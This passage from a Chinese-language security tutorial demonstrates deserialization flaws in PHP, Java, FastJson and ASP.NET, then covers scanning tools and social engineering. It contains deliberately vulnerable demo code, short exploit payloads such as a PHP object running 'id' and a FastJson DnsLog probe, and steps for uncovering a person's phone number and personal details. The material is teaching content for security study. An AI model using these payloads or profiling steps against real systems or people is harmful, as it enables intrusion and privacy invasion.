			print "<h1>ABCD</h1>";
		}
	}
	// 实例化一个对象a
	$a=new A();
	// 序列化对象a
	print "Serialize Object A: ".serialize($a)."<br/>";
?>
```

PHP中序列化后的数据中并没有像Python一样包含函数`__construct`和`print`的信息，而仅仅是类名和成员变量的信息，因此，在`unserialize`函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞，使用下面代码定义一个包含魔术方法`__destruct`的类A，然后实例化一个对象a并输出序列化后的数据，在对象销毁的时候程序会调用system函数执行df命令，然后通过GET方法传递参数arg的值给服务器进行反序列化

```php
<?php
	// 定义一个类
	class A{
		// 设置变量值为df
		var $test = "df";
		// 定义析构函数，在类A销毁时执行system("df")
		function __destruct(){
			print "Execute CMD: ".$this->test."<br/>";
			print "Result: ";
			system($this->test);
			print "<br/>";
		}
	}
	// 实例化一个对象a
	$a=new A();
	// 序列化对象a
	print "Serialize Object A: ".serialize($a)."<br/>";
	// GET方式获取参数arg的值
	$arg = $_GET['arg'];
	// 反序列化参数arg的值
	$a_unser = unserialize($arg);
?>
```

不传入`arg`参数时，服务器返回对象a序列化后的数据和`df`命令执行的结果，利用对象a序列化后的值构造执行`id`命令的`Payload：O:1:"A":1:{s:4:"test";s:2:"id";}`，通过`arg`参数提交之后，在反序列化的过程中成功覆盖变量`test`的值为`id`，并在对象销毁时执行命令，当然，现实环境中几乎没有这样方便的攻击链，需要花不少时间去寻找POP链，[https://www.freebuf.com/column/203767.html](https://www.freebuf.com/column/203767.html)，[https://www.freebuf.com/column/203769.html](https://www.freebuf.com/column/203769.html)

###### <font color="yellow">c. Java反序列化漏洞实验</font>

Java中通常使用`Java.io.ObjectOutputStream`类中的`writeObject`方法进行序列化，`java.io.ObjectInputStream`类中的`readObject`方法进行反序列化，使用下面代码将字符串进行序列化和反序列化

```java
package com.company;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.FileOutputStream;
import java.io.FileInputStream;

public class Main{
	public static void main(String args[]) throws Exception {
		String obj = "hello";
		// 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时，按照Java的标准约定是给文件一个.ser扩展名
		FileOutputStream fos = new FileOutputStream("a.ser");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(obj);
		os.close();
		// 从文件a.ser中读取数据
		FileInputStream fis = new FileInputStream("a.ser");
		ObjectInputStream ois = new ObjectInputStream(fis);
		// 通过反序列化恢复字符串
		String obj2 = (String)ois.readObject();
		System.out.println(obj2);
		ois.close();
	}
}
```

程序执行后生成`a.ser`文件，以十六进制查看`a.ser`文件内容

```text
aced 0005 7400 0568 656c 6c6f
```

Java序列化数据格式始终以双字节的十六进制`0xAC ED`作为开头，Base64编码之后为`rO0`，之后的两个字节是版本号，通常为`0x00 05`，一个Java类的对象要想序列化成功，必须满足两个条件

- 该类必须实现`java.io.Serializable`接口
- 该类的所有属性必须是可序列化的，如果有一个属性不是可序列化的，则该属性必须注明是短暂的

使用下面代码将对象序列化后存储到a.ser文件

```java
package com.company;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.io.IOException;

// 定义一个实现 java.io.Serializable 接口的类Test
class Test implements Serializable {
	public String cmd="calc";
	// 重写readObject()方法
	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
		// 执行默认的readObject()方法
		in.defaultReadObject();
		// 执行打开计算器程序的命令
		Runtime.getRuntime().exec(cmd);
	}
}
public class Main{
	public static void main(String args[]) throws Exception{
		// 实例化对象test
		Test test = new Test();
		// 将对象test序列化后写入a.ser文件
		FileOutputStream fos = new FileOutputStream("a.ser");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(test);
		os.close();
	}
}
```
执行程序后生成a.ser文件，以十六进制格式查看文件内容

```text
aced 0005 7372 0010 636f 6d2e 636f 6d70
616e 792e 5465 7374 da4b c8dc cb93 5ebc
0200 014c 0003 636d 6474 0012 4c6a 6176
612f 6c61 6e67 2f53 7472 696e 673b 7870
7400 0463 616c 63
```
最后5个字节分别为字符串长度和calc的ASCII值，因此，修改文件为下图所示，即notepad的ASCII值和长度

```text
aced 0005 7372 0010 636f 6d2e 636f 6d70
616e 792e 5465 7374 da4b c8dc cb93 5ebc
0200 014c 0003 636d 6474 0012 4c6a 6176
612f 6c61 6e67 2f53 7472 696e 673b 7870
7400 078e 6f74 6570 6164
```

使用下面代码进行反序列化对象

```java
package com.company; 
import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.Serializable;
import java.io.IOException;

// 定义一个实现 java.io.Serializable 接口的类Test
class Test implements Serializable {
	public String cmd="calc";
	// 重写readObject()方法
	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
		// 执行默认的readObject()方法
		in.defaultReadObject();
		// 执行打开计算器程序的命令
		Runtime.getRuntime().exec(cmd);
	}
}

public class Main{
	public static void main(String args[]) throws Exception{
		// 从a.ser文件中反序列化test对象
		FileInputStream fis = new FileInputStream("a.ser");
		ObjectInputStream ois = new ObjectInputStream(fis);
		Test objectFromDisk = (Test)ois.readObject();
		System.out.println(objectFromDisk.cmd);
		ois.close();
	}
}
```

程序执行后成功运行notepad，现实环境中也没有这样方便的攻击链，需要去寻找POP链[https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/](https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/)

###### <font color="yellow">d. FastJson反序列化漏洞简单实验</font>

FastJson作为史上最快的Json解析库应用也十分广泛，在1.2.69版本以下，其AutoType特性在反序列化过程中会导致反序列化漏洞，这个特性就是：在对JSON字符串进行反序列化的时候，会读取@type参数指定的类，然后把JSON内容反序列化为此类的对象，并且会调用这个类的设置(setter)

方法

> 实验环境
> 
> 前端采用json提交用户名密码
> 
> 后台使用fastjson 1.2.24版本
> 
> 源码和WAR包[https://github.com/NHPT/Java_Deserialization_Vulnerability_Experiment](https://github.com/NHPT/Java_Deserialization_Vulnerability_Experiment)
> 
> 创建一个User类，用于查看序列化数据格式
> 
> 创建一个home类用于输出user对象的序列化数据
> 
> 创建一个login类用于获取前端页面提交的json格式用户名和密码数据，并使用`JSON.parseObject`方法进行反序列化解析json数据，在后台可看到提交的数据
> 
> 访问home页面可直接获取user对象序列化后的结果
> 
> `@type`的值为对象所属的类，user和passwd分别为对象的用户名属性和密码属性
> 
> 因此可以利用`AutoType`特性，构造一个使用`@type`参数指定一个攻击类库，包含类属性或方法的JSON字符串提交到服务器，在反序列化时调用这个类的方法达到执行代码的目的
> 
> 通常使用`java.net.Inet4Address`类或`java.net.Inet6Address`类，通过`val`参数传递域名，利用DnsLog进行漏洞检测，即：`{"@type":"java.net.Inet4Address","val":"DnsLog"}`
> 
> 在登录页面输入用户名和密码提交，拦截数据包，修改提交的Json数据
> 
> 虽然服务器返回错误信息，但Payload仍然被成功执行，在DnsLog网站可以看到解析记录
> 
> 要执行命令需要构造新的POP链，常用的POP链
> 
> - 基于JNDI注入
> - 基于ClassLoader
> - 基于TemplatesImpl
> 
> 由于本实验仅使用最小依赖编写，此处不再详细分析POP链，更多资料请查阅
> 
> [https://www.cnblogs.com/nice0e3/p/14776043.html](https://www.cnblogs.com/nice0e3/p/14776043.html)
> 
> [https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/](https://p0rz9.github.io/2019/05/12/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BTemplatesImpl%E8%B0%83%E7%94%A8%E9%93%BE/)

###### <font color="yellow">e. ASP.NET反序列化实验</font>

.NET框架包含多个序列化类，`BinaryFormatter`，`JavaScriptSerializer`，`XmlSerializer`，`DataContractSerializer`，本实验以XML序列化和反序列化为例

实验环境

- 采用Xml提交数据
- 使用.NET Framework 4.6.1
- 完整源码[https://github.com/NHPT/ASP.NET-Deserialization-Vulnerability-Experiment](https://github.com/NHPT/ASP.NET-Deserialization-Vulnerability-Experiment)

使用下面代码定义一个Test类，包含执行`ipconfig`命令并返回执行结果的函数`Run`，使用`XmlSerializer`类将对象序列化后输出到页面

```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Xml.Serialization;

namespace ASP.NETStudy
{
	[Serializable]
	public class Test
	{
		public string _cmd = "ipconfig";
		public Test(string cmd)
		{
			_cmd = cmd;
		}
		public Test()
		{
		}
		public String Run()
		{
			Process p = new Process();
			// 设置要启动的应用程序
			p.StartInfo.FileName = "cmd.exe";
			// 不使用操作系统shell启动
			p.StartInfo.UseShellExecute = false;
			// 接受来自调用程序的输入信息
			p.StartInfo.RedirectStandardInput = true;
			// 输出信息
			p.StartInfo.RedirectStandardOutput = true;
			// 输出错误
			p.StartInfo.RedirectStandardError = true;
			// 不显示程序窗口
			p.StartInfo.CreateNoWindow = true;
			// 启动程序
			p.Start();
			// 向cmd窗口发送命令
			p.StandardInput.WriteLine(_cmd + "&exit");
			// 自动刷新
			p.StandardInput.AutoFlush = true;
			// 获取输出信息
			string strOuput = p.StandardOutput.ReadToEnd();
			//等待程序执行完退出进程
			p.WaitForExit();
			p.Close();
			// 返回执行结果
			return strOuput;
		}
	}
	public partial class _default : System.Web.UI.Page
	{
		protected void Page_Load(object sender, EventArgs e)
		{
			// 实例化对象 sc_Test
			Test sc_Test = new Test();
			// 创建字符串缓冲区buffer
			StringBuilder buffer = new StringBuilder();
			// 实例化序列号对象
			XmlSerializer serializer = new XmlSerializer(typeof(Test));
			// 序列化对象sc_Test并存储到buffer
			using (TextWriter writer = new StringWriter(buffer))
			{
				serializer.Serialize(writer, sc_Test);
			}
			String str = buffer.ToString();
			// 将xml数据HTML实体化，防止Windows安全检查拦截
			string r = string.Empty;
			for (int i = 0; i < str.Length; i++)
			{
				r += "&#" + Char.ConvertToUtf32(str, i) + ";";
			}
			// 输出到页面
			Response.Write("<center><h2>序列化数据</h2><textarea rows=\"10\" cols=\"100\" readonly align=\"center\">" + r+ "</textarea></center>");
		}
	}
}
```

使用下面代码将提交的XML数据反序列化，并执行对象的Run函数

```C#
using System;
using System.IO;
using System.Xml.Serialization;

namespace ASP.NETStudy
{
	public partial class info : System.Web.UI.Page
	{
		protected void Page_Load(object sender, EventArgs e)
		{
			if (Request.RequestType == "POST")
			{
				// 获取客户端提交的数据
				StreamReader s = new StreamReader(Request.InputStream);
				// 转换为String格式
				String ss = s.ReadToEnd();
				//Response.Write(ss);
				// 定义反序列化对象
				Test dsc_Test;
				XmlSerializer serializer = new XmlSerializer(typeof(Test));
				// 反序列化数据为dsc_Test对象
				using (TextReader reader = new StringReader(ss))
				{
					Object obj = serializer.Deserialize(reader);
					dsc_Test = (Test)obj;
				}
				// 调用对象的函数Run并返回执行结果到浏览器
				Response.Write(dsc_Test.Run());
			}
		}
	}
}
```

正常情况下访问页面，返回序列化后的数据，点击查看IP按钮后，客户端提交数据，服务器执行命令后返回到客户端，如果攻击者将传输的XML数据进行篡改，服务器在反序列化后执行`whoami`命令

###### <font color="yellow">f. 防御方法</font>

对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码，对反序列化接口添加认证授权，设置反序列化服务仅在本地监听或者设置相应防火墙策略，禁止使用存在漏洞的第三方框架库，过滤、禁用危险函数，过滤T3协议或限定可连接的IP，设置Nginx反向代理，实现t3协议和http协议隔离

###### <font color="yellow">g. 工具</font>

- Java[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- PHP[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
- .NET[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

### <font color="yellow">10 漏洞扫描</font>
		
#### <font color="yellow">001 网络漏洞扫描的三个阶段</font>

- 寻找目标主机或网络
- 在主机或网络内搜集信息，包括OS类型，运行的服务/端口以及服务软件的版本等
- 根据系统类型和服务软件，判断或进一步检测系统是否存在安全漏洞
    
#### <font color="yellow">002 漏洞扫描的两种策略</font>

被动式策略：被动式策略就是基于主机之上，对系统中不合适的设置、脆弱的口令以及其他与安全规则抵触的对象进行，检查，称为系统安全扫描

主动式策略：主动式策略是基于网络的，它通过执行一些脚本文件模拟对系统进行攻击的行为并记录系统的反应，从而，发现其中的漏洞，称为网络安全扫描

#### <font color="yellow">003 漏洞扫描技术的原理</font>

漏洞扫描技术是建立在端口扫描技术的基础之上的，从对黑客的攻击行为的分析和收集的漏洞来看，绝大多数都是针对某一个特定的端口的，所以漏洞扫描技术以与端口扫描技术同样的思路来开展扫描的，漏洞扫描技术的原理是主要通过以下两种方法来检查目标主机是否存在漏洞，在端口扫描后得知目标主机开启的端口以及端口上的网络服务，将这些相关信息与网络漏洞扫描系统提供的漏洞库进行匹配，查看是否有满足匹配条件的漏洞存在，通过模拟黑客的攻击手法，对目标主机系统进行攻击性的安全漏洞扫描，若模拟攻击成功，则表明目标主机系统存在安全漏洞

漏洞库的特征匹配方法

> 基于网络系统漏洞库的漏洞扫描的关键部分就是它所使用的漏洞库，通过采用基于规则的匹配技术，即根据安全专家对网络系统安全漏洞、黑客攻击案例的分析和系统管理员对网络系统的安全配置的实际经验，可以形成一套标准的网络系统漏洞库，然后再次基础上构成相应的匹配规则，由扫描程序自动的进行漏洞扫描的工作，若没有被匹配的规则，系统的网络连接是禁止的
> 
> 工作原理：扫描客户端提供良好的界面，对扫描目标的、范围、方法等进行设置，向扫描引擎（服务器端）发出扫描命令，服务器根据客户端的选项进行安全检查，并调用规则匹配库检测主机，在获得目标主机TCP/IP端口和其对应的网络访问服务的相关信息后，与网络漏洞扫描系统提供的系统漏洞库进行匹配，如果满足条件，则视为存在漏洞。服务器的检测完成后将结果返回到客户端，并生成直观的报告。在服务器端的规则匹配库是许多共享程序的集合，存储各种扫描攻击方法。漏洞数据从扫描代码中分离。使用户能自行对扫描引擎进行更新，因此漏洞库信息的完整性和有效性决定了漏洞扫描的性能，漏洞库的修订和更新的性能也会影响漏洞扫描系统运行的时间

功能模块(插件)技术

> 插件是由脚本语言填写的子程序，扫描程序可以通过调用它来执行漏洞扫描，检测出系统中存在的一个或多个漏洞，添加新的插件就可以使漏洞扫描软件增加新的功能，扫描出更多的漏洞，插件编写规范化后，基于用户自己都可以Perl、C或自行设计的脚本语言编写的插件来扩充漏洞扫描软件的功能，这种技术使漏洞扫描软件的升级维护变的相对简单，而专用脚本语言的使用也简化了编写新插件的编程工作，使漏洞扫描软件具有强的扩展性
> 工作原理：它的前端工作原理基本和基于网络系统漏洞库的漏洞扫描工作原理相同，不同的就是将系统漏洞库和规则匹配库换成了扫描插件库和脆弱性数据库，扫描插件库包含各种脆弱性扫描插件，每个插件对一个或多个脆弱点进行检查和测试，插件之间相对独立，这部分应该随着新脆弱性的发现而及时更新，脆弱性数据库收集了国际上公开发布的脆弱性数据，用于检查检测的完备性，它与扫描插件库之间是一对一或者是一对多的关系，寄一个插件可以进行一个或多个脆弱点的检测，因此，扫描插件库和脆弱性数据库可以及时更新，具有很强的扩展性
    
#### <font color="yellow">004 工具</font>

##### <font color="yellow">0001 Nmap</font>

Nmap即Network Mapper，它是在免费软件基金会的GNU General Public License (GPL)下发布的，其基本功能有

- 探测一组主机是否在线
- 扫描主机端口，嗅探提供的网络服务
- 判断主机的操作系统

软件下载后，执行`configure`、`make`和`make install`三个命令，将nmap二进制码安装到系统上，就可以执行nmap了

Nmap支持不同类别的端口扫描，TCP连接扫描可以使用`-sT`命令

`nmap -sT -p 80 -I -O www.yourserver.com`

nmap工具的用法

1. 定目标

    `nmap -IP 默认-sT`
	`nmap -iL`
	`nmap 192.168.1.0/24 扫描网段`

2. 端口

	`nmap -p80 IP`
	`nmap -p22,80,8080 IP`

3. 全端口扫描

    `nmap -p1-65535 IP`
	`nmap -p- IP`
	`nmap –allports IP`
	`nmap 不设定端口的时候，默认扫描最有可能开放的1000个端口`

4. 主机发现

	`-sn 不使用ping命令扫描`
	`-Pn 跳过主机发现，直接进行端口扫描`
	`-PS 使用syn进行主机发现`
	`-P0 无ping扫描`

5. 端口扫描

	`-sS 使用syn隐蔽式扫描`
	`-sT 使用tcp全连接扫描`
	`-sA ack包`
	`-sU udp包`

6. 版本识别

	`-sV 服务版本识别`
	`-O 操作系统版本识别`

7. 输出

	`-o 输出可阅读文档`
	`-oG 输出可供grep处理的文档`
	`-oN 输出标准文档`

8. 扫描速率

	`T0-T5 默认T3`

##### <font color="yellow">0002 p0f</font>

p0f对于网络攻击非常有用，它利用SYN数据包实现操作系统被动检测技术，能够正确地识别目标系统类型，和其他扫描软件不同，它不向目标系统发送任何的数据，只是被动地接受来自目标系统的数据进行分析，因此，一个很大的优点是几乎无法被检测到，而且p0f是专门系统识别工具，其指纹数据库非常详尽，更新也比较快，特别适合于安装在网关中

##### <font color="yellow">0003 ISS</font>

ISS Internet Scanner是全球网络安全市场的顶尖产品，通过对网络安全弱点全面和自主地检测与分析并检查它们的弱点，将风险分为高中低三个等级，并且可以生成大范围的有意义的报表，现在，这个软件的收费版本提供了更多的攻击方式，并逐渐朝着商业化的方向发展

##### <font color="yellow">0004 Nessus</font>
	
Nessus是一款功能强大的远程安全扫描器，它具有强大的报告输出能力，可以产生HTML、XML、LaTeX和ASCII文本等格式的安全报告，并能为每个安全问题提出建议，软件系统为client/sever模式，服务器端负责进行安全检查，客户端用来配置管理服务器端。在服务端还采用了`plug-in`的体系，允许用户加入执行特定功能的插件，可以进行更快速和更复杂的安全检查，除了插件外，Nessus还为用户提供了描述攻击类型的脚本语言，来进行附加的安全测试，Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它，该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库，Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描，对应渗透测试人员来说，Nessus是必不可少的工具之一

##### <font color="yellow">0005 Xprobe</font>

XProbe是一款主动操作系统指纹识别工具，它可以测定远程主机操作系统的类型，XProbe依靠与一个签名数据库的模糊匹配以及合理的推测来确定远程操作系统的类型，利用ICMP协议进行操作系统指纹识别是它的独到之处，使用时，它假设某个端口没有被使用，它会向目标主机的较高端口发送UDP包，目标主机就会回应ICMP包，然后，XProbe会发送其他的包来分辨目标主机系统，有了这个软件，判断对方的操作系统就很容易了

### <font color="yellow">11 社会工程学</font>

#### <font color="yellow">001 IP地址获取及定位</font>

##### <font color="yellow">0001 IP地址获取</font>

ThreatScan在线扫描工具

> [https://scan.top15.cn](https://scan.top15.cn)
> 
> [http://whois.chinaz.com/](http://whois.chinaz.com/)
> 
> [https://x.threatbook.cn/](https://x.threatbook.cn/)
> 
> [http://whois.domaintools.com/](http://whois.domaintools.com/)
> 
> [http://toolbar.netcraft.com/site_report?url=](http://toolbar.netcraft.com/site_report?url=)
> 
> [https://www.robtex.com/](https://www.robtex.com/)
> 
> [https://whois.aizhan.com/](https://whois.aizhan.com/)
> 
> [https://scan.top15.cn/web/](https://scan.top15.cn/web/)

基础信息扫描

> 包括域名、IP地址、有无CDN、编程语言、是否存在WAF(Web应用防护系统)、操作系统、指纹框架、Web容器、网络权重等，注意，ThreatScan通过Web指纹识别，发现该网站采用Java进行开发

端口扫描

> [http://tool.chinaz.com/port/](http://tool.chinaz.com/port/)
> 
> [https://www.sojson.com/zz/portscan.html](https://www.sojson.com/zz/portscan.html)
> 
> 接着将IP地址填写到端口处，进行相关扫描，端口扫描是获取目标主机的端口信息显得十分有必要，通过一些常见端口，可以大致得出目标主机运行的服务，为后续渗透测试薄弱点提供参考

旁站扫描

> 旁站扫描能扫描与该IP地址挂靠的其他网站，这有利于Web渗透，可能旁站存在漏洞

信息泄露查询

> 同时，Namp软件可以获取IP地址拓扑图，方便观察网络跳数，尤其是大的网段，用Zenmap

##### <font color="yellow">0002 IP物理定位</font>

IP物理定位可以通过百度地图开发者服务(web 服务API)、第三方接口、在线网站等进行定位，但不同的接口其精确度也会不同，服务商通常会按照区域划分ip地址，凡是通过网络接入到服务器，就一定能获取ip和地址定位，从而获取目标的物理位置，假设某人发了某个危害的帖子或从事相关活动，有关部门就需要抓他，此时，首先要获取他真实的IP地址，通过服务器对比，观察这个时间点它把IP分配给谁(通常实名制)；再通过IP地址进行物理定位，后台日志通常会存储相关的IP地址及行为，现在，通过三大运营商数据、Wifi、基站、社交网络、视频等，都能进行一些更为智能精确的定位，从而维护整个社会的网络安全

方法

> 1. Python查询经纬度
> 	
>   调用本地文件实现
>   
> 	> 本地存在一个名叫GeoLiteCity.dat的文件，它包含了详细的地址对照信息，通过编写代码查询对应的值获取信息，这里以作者的博客地址为例，备案在阿里服务器上，需要安装库pygeoip
>   > 
> 	> 原理：调用百度API获取经纬度返回的Json结果
> 
> 2. 网站定位位置
> 	[https://www.opengps.cn/Data/IP/ipplus.aspx](https://www.opengps.cn/Data/IP/ipplus.aspx)
> 	
>   1. 安全建议
>       
>       在搭建个人网站时一定要保护好自己的邮箱和电话，尤其是注册某些不熟悉的网站时，一定要要保护好个人信息，钓鱼邮件、短信、电话、软件都不要去点击，安装相关的杀毒软件，做好个人隐私保护，如果是企业级公司，网站做好相关的安全防护，安装WAF、IP保护、系统日志、安全检测、弱口令、社工杜绝都非常重要
>       
> 	2. 手机查找
> 		
>       通过各大网站已知有价值的ID获取其他信息(如电话号码、QQ、微信)，通过电话或QQ获取用户的登录账号，是常见的社会工程学手段
>       
> 		- 通过已知信息查找有价值的ID或其他信息
> 		- 用密码找回功能获取部分手机号信息
> 		- 找出所在城市获得手机号段
> 		- 用手机号码生成器或Python循环遍历生成手机号并导入手机
> 		- 利用手机号码和物理位置来恶意获取信息，利用手机号继续查找信息

其他技巧

> 也许有些人经历过，在微信群里晒了一张并没有定位的自拍，却被不在现场的朋友们发现了你的位置，这就是照片原图泄露了你的位置，其原因是智能手机在拍照的时候，都有一个叫`Exif`的东西，它包括快门、光圈、iso、白平衡、日期时间等各种图像数据，还有一个重要的信息——位置信息，如果不经过处理，这些`Exif`参数会一直存在，在拍照的时候软件调用了`Exif`中的GPS全球定位系统数据，同时，经过各种美图软件处理过的照片都会在相册中显示位置信息，而且不少美颜软件都自带定位功能，打开相机找到保存地理位置选项，并选择不打勾，接着我们将经纬度进行解析，它是以度分秒的格式展示的(度分秒之间以；间隔)，为了方便定位，我们需要将度分秒转换为度的格式，纬度为：`26；22；50.48263499999301`，其计算方法为：`26+(22+50.48263499999301/60)/60 = 26.3806896208`，经度为：`106；38；25.123901000013689`，其计算方法为：`106+(38+25.123901000013689/60)/60 = 106.64031219472223`
> 
> 安全建议：同样其他文件都会暴露一些信息，包括PPT、Word等，要学会保护自己的隐私及版权，社会工程学的本质是欺骗，不要轻易相信他人，不要到处留下自己的个人信息，要学会设置代理、短信验证、日志记录

#### <font color="yellow">002 简介</font>

社会工程学是黑客米特尼克悔改后在《欺骗的艺术》中所提出的，是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段，在信息安全这个链条中，人的因素是最薄弱的一环节，社会工程就是利用人的薄弱点，通过欺骗手段而入侵计算机系统的一种攻击方法，组织可能采取了很周全的技术安全控制措施，例如：身份鉴别系统、防火墙、入侵检测、加密系统等，但由于员工无意当中通过电话或电子邮件泄露机密信息(如系统口令、IP地址)，或被非法人员欺骗而泄露了组织的机密信息，就可能对组织的信息安全造成严重损害，社会工程学通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取用户系统的秘密，熟练的社会工程师都是擅长进行信息收集的身体力行者，很多表面上看起来一点用都没有的信息都会被这些人利用起来进行渗透，比如说一个电话号码，一个人的名字，或者工作的ID号码，都可能会被社会工程师所利用，这意味着没有把人这个因素放进企业安全管理策略中去的话将会构成一个很大的安全裂缝，简单来说，社会工程学就是利用一个人的缺点(贪婪，狂妄)、优点(自信，怜悯)，来从中套取我们想要的信息，可以说行骗艺术的分类有两种，一种是通过诈骗、欺骗来获得钱财，这就是通常的骗子，另一种则通过蒙蔽、影响、劝导来达到获取信息的目的，这就是社会工程师

基础信息：收集数据

- 真实名字
- 出生日期
- 身份证号
- 籍贯
- QQ号
- 不大众化的网络昵称
- 就读的大学
- 就读的高中
- 学号
- 你认识的他的朋友圈子的人
- 共同朋友的资料
- ……

以下部分引用于《欺骗的艺术》对专业术语的介绍

1. 马克(MARK)：受骗者
2. 激警(BURN THE SOURCE)：攻击者如果让对方看出来攻击的意图称为激警，一旦对方有所警觉并通知其他人员，以后再想套出类似的信息就十分困难了
3. 秘密通信地(Mail Drop)：社会工程师把租来的邮箱称为秘密通信地，通常是用假名字租用的，用来接收受骗者发来的文件和包裹
4. 特洛伊木马：一种包含恶意或会造成危害的代码，用来损坏受害者的计算机或文件，或是从受害者的计算机和网络上获取信息，某些特洛伊木马会隐藏在操作系统中暗中监视击键或操作，或者通过网络连接来执行一些入侵命令，而这一切是在受害者意识不到的情况下进行的
5. 远程命令行解释器：接受文本命令来执行某种功能或运行程序的非图形操作界面，通过利用漏洞或在目标计算机上安装木马，攻击者可以获得对命令行解释器的远程访问权
6. 反向社会工程学：攻击者设计的一种情形，受骗者碰到问题时会联系攻击者求助，另一种反向社会工程学是对付攻击者的，被攻击目标发现了对方是攻击者后，利用心理影响尽可能的从攻击者身上套出信息以保护企业的信息资产
7. 哈希密码(PASSWORD HASH)：对口令进行一次性的加密处理而形成的杂乱字符串，这个加密过程被认为是不可逆的，也就是说，人们认为从哈希串中是不可能还原出原口令的
8. 秘点(DEAD DROP)：很难被别人发现的存放信息的地方，在传统的间谍活动中，秘点可能是一堵墙壁上某块松动的石头，对于计算机黑客来说，一般都是位于遥远国度的互联网上的一个站点
9. 软心糖安全：贝尔实验室的贝劳文和切斯威克提出的说法，用以描述一种安全状况，外部防御十分强壮，如防火墙，但其后面的设施却十分脆弱
10. 地下酒吧式的安全：知道自己想要的信息在哪里，并且使用一个词或是名称来获得对此信息或计算机系统的访问权的一种安全形式，这个关健在于知道地下酒吧的位置，门上没有标志，而酒吧老板也不会挂一盏霓虹灯在门口来表示这儿有个酒吧，通常，只要能找到地方就基本可以进入，很不幸，同样的安全措施在企业中广泛存在，这种没有任何保护的安全级别我称之为地下酒吧式的安全
11. 隐晦安全：一种效率低下的计算机安全手段，通过对系统运转细节(协议、算法和内部系统)的保密来达到防范目的，隐晦安全假定可信任成员组以外的人不能接近系统，因此这种安全并不可靠
12. 双因素认证：用两种不同的验证方式对身份进行确认，比如，一个人必须从某个可确认的地方打来电话并知道口令来确认自已的身份，然后工作人员从你的信息中选出某个条目(通常为社会保险号码、出生日期或是母亲的姓氏)来询问你，如果你的答案正确，这就是第二次的验证――基于你应该知道的信息，时间令牌有两种型号，一种只有一张信用卡的一半大小，但稍厚些，另一种小到可以挂到钥匙链上 
13. 恶意软件：一种危害性的程序，例如病毒、蠕虫，或是木马
14. 后门：在用户不知道的情况下进入用房计算机的一个隐蔽入口，编程人员在开发软件时，也会用其来进入程序以解决问题，安全超文本传输协议(HTTP)或安全套接层协议(SSL)提供一个使用数字证书的自动机制，不仅可以加密发送到远端站点的信息，还可以对其进行认证(保证所连接的站点是真实可信的)，然而，这种保护机制对于那些疏于检验地址栏中的网址是否为他们想访问站点的用户是无效的 
15. 警告：在没有使用安全协议的站点上，一定不要输入个人的敏感信息，如地址、电话、信息卡号或银行账号，或者是任何你不想泄露的私人信息
16. 安全套接层协议：网景开发的用于互联网上客户与服务器端的安全认证协议，经常性的更新病毒库可以基本保证计算机的安全性，但这并不足以完全保证安全，还有一些病毒或蠕虫是防病毒软件公司未知的，因此相应的保护程序也就没有发布 
17. 哑终端：一台没有处理器的终端，只能响应简单的控制码和显示字符及数字
18. 逆向骗局：一种入侵手段，让被攻击者向攻击者寻求帮助
19. 垃圾搜寻：从一家公司的垃圾中(通常是在外部和易受攻击的地方)找出被抛弃的可用于社会工程学攻击的信息，例如内部的电话号码或资料 
20. 直通：电话公司术语，当电话被拿起时接通一个特殊的号码
21. 呼叫拒绝：电话公司的一个服务选项，设置某个电话号码无法呼入
22. 终端基础安全：基于特定的计算机终端作为安全验证，这一做法在IBM大型计算机中非常流行
23. 比赛很简单：入侵，赢得美金，一场公开的惊人表演......除非有人能打败他们并拿走钱，他们非常相信他们的产品，甚至还在展台上勇敢地公布了系统中的一些账户名称和相应的密码，不只是普通账户，还包括所有的特权账户
24. 这其实没有听上去的那么勇敢：我知道，在这种设置类型中，每台终端都插在计算机自身的一个端口上，不难断定他们已经设置了这五台终端只能从非系统管理员权限登陆，看来似乎只有两条路，要么完全突破安全程序(这正是LOCK-II被设计来防范的)，要么用开发者难以想象的某种方法绕路而行
25. 列举：查看操作系统已启动的服务并列出允许访问系统的用户的账户名
26. 暴力破解：通过尝试每一种可能的字母、数字、符号组合对密码进行破解
27. 补丁：修正一个可执行程序的一些代码
28. 间谍程序：用于监控目标计算机活动的专业软件，一种形式是记录因特网购物者访问过的站点，这样在线广告就可以根据他们的上网习惯进行修改，另一种形式类似于监听，除了目标设备是计算机，这些软件监控用户的活动，包括密码、按键、Email、聊天记录、即时聊天、所有访问过的网站和显示屏图像
29. 无声安装：在计算机用户或操作员毫不知情的情况下安装软件程序的一种方法
30. 肩窥：通过监视用户输入，窃取密码或其它用户信息的行为
31. GZIP：使用一个Linux GNU工具把多个文件压缩到一个单独的文件中
32. 匿名FTP：无需账户也能通过文件传输协议(FTP)访问远程计算机，虽然匿名FTP可以在没有密码的情况下访问，但是用户的访问权限通常会限制在几个指定的文件夹内

### <font color="yellow">12 多IP访问</font>

#### <font color="yellow">001 python爬虫</font>

